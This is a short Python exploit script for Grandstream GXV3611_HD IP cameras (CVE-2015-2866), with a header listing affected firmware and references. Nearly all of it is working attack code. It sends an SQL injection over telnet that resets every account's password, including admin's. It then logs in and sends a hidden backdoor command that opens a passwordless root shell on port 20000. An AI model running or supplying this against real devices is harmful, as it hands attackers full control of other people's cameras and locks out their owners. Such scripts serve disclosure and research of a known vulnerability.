# Exploit Title: Grandstream GXV3611_HD Telnet SQL Injection and backdoor command
# Exploit Author: pizza1337
# Vendor Homepage: http://www.grandstream.com/
# Version: GXV3611_HD Core 1.0.3.6, 1.0.4.3
# GXV3611IR_HD Core 1.0.3.5
# Tested on:
# -GXV3611_HD
#  Bootloader Version: 	1.0.0.0
#  Core Version: 	1.0.4.3
#  Base Version: 	1.0.4.43
#  Firmware Version: 	1.0.4.43
# -GXV3611IR_HD
#  Bootloader Version:  1.0.3.5
#  Core Version:        1.0.3.5
#  Base Version:        1.0.3.5
#  Firmware Version:    1.0.3.5
# CVE : CVE-2015-2866
# Category: remote
# More information:
# https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2866
# https://www.kb.cert.org/vuls/id/253708
# Description:
# http://boredhackerblog.blogspot.com/2016/05/hacking-ip-camera-grandstream-gxv3611hd.html
import telnetlib
import sys

if len(sys.argv) < 2:
    print "USAGE: python %s IP_ADDRESS"%sys.argv[0]
    quit()

conn = telnetlib.Telnet(sys.argv[1])
conn.read_until("Username: ")
conn.write("';update user set password='a';--\r\n") #This changes all the passwords to a, including the admin password
conn.read_until("Password: ")
conn.write("nothing\r\n")
conn.read_until("Username: ")
conn.write("admin\r\n")
conn.read_until("Password: ")
conn.write("a\r\n") #Login with the new password
conn.read_until("> ")
conn.write("!#/ port lol\r\n") #Backdoor command triggers telnet server to startup. For some reason, typing "!#/ port" does not seem to work.
conn.read_until("> ")
conn.write("quit\r\n")
conn.close()
print "Telnet into port 20000 with username root and no password to get shell" #There is no login password